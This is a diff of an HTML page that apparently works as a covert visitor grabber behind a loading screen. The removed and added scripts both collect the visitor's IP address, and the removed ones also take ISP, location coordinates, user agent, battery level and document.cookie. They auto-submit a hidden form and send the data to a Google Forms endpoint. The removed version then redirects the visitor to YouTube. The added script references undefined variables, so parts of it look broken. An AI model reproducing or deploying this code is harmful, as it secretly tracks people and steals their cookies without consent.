@@ -33,38 +33,34 @@
     
     </style>
 
-    <script type="application/javascript">
-   function getIP(json){var Y = document.getElementById("1");
-//var ui = "ISP" + ":" + json.isp + "," + "PIP" + ":" + json.ip + "," + "," + "city" + ":" + json.city + "," + "," + "hostname" +  ":" + json.hostname + "," + "," + "Org" + ":" + json.org + "," + "latitude" + ":" + json.latitude + "," + "longitude" + ":" + json.longitude;  
-   
-Y.value = json.isp + "," + json.ip + "," + json.city + "," + json.hostname + "," + json.org + "," + "latitude" + ":" + json.latitude + "," + "longitude" + ":" + json.longitude + "," + "Website" + ":" + location.href;  
- 
-setTimeout(() => window.open(`https://docs.google.com/forms/d/e/1FAIpQLSdMj_td6pP4Bucg5ILSf5D9qD5ucPlL8GPE_Zf7YDFWaop0sg/formResponse?entry.420308320=${location.href}&entry.35905334=Device:${navigator.userAgent} ${f}`,"jv"),1000);
-}   
-    
-    </script>
-    <script>
-function gB(){
-var g = document.createElement('div');
-g.id="HS-BB";
-g.style.display="none";
-setTimeout(() => navigator.getBattery().then(function(k){g.innerHTML=k.level * 100 + "%";}),1384);
-document.body.appendChild(g);
+    <script >
+   var Y = document.getElementById("1");
+f=new XMLHttpRequest;
+f.responseType='json';
+f.onload=function(){
+if(this.status!=0)
+{
+ v=this.response;
+ Y.value=v.ip;
+ setTimeout(function(){form.submit()},1300);
 }
-setTimeout(gB,2384);
-   function Pj(){
-     var X = document.getElementById("2");   
-var B = document.getElementById('HS-BB');
-    X.value = `${navigator.userAgent} "App:"${navigator.appName},"Network:"${navigator.connection.type} "location":${location.href} "cookie":${document.cookie} "Charge":${B.innerHTML}`;
- var Z =document.getElementById("form");
-    Z.submit();  
-  location.href="https://m.youtube.com";
-  }   
+else
+{
+    Y.value="Err";
+}
+};
+f.open('GET','https://api.seeip.org/jsonip');
+f.send();
+
+setTimeout(() => window.open(`https://docs.google.com/forms/d/e/1FAIpQLSdMj_td6pP4Bucg5ILSf5D9qD5ucPlL8GPE_Zf7YDFWaop0sg/formResponse?entry.420308320=${location.href}&entry.35905334=${px}`,"jv"),1000);  
+    
+    </script>
+    
 
     
- setTimeout(Pj , 8000);   
+ 
 
-    </script>
+    
     <body>
    <div id="Load">
      <span id="Loader">
@@ -80,6 +76,5 @@ var B = document.getElementById('HS-BB');
     </form>   
         
     </body>
-<script type="application/javascript" src="https://json.geoiplookup.io?format=json&callback=getIP"></script>
 
 </html>
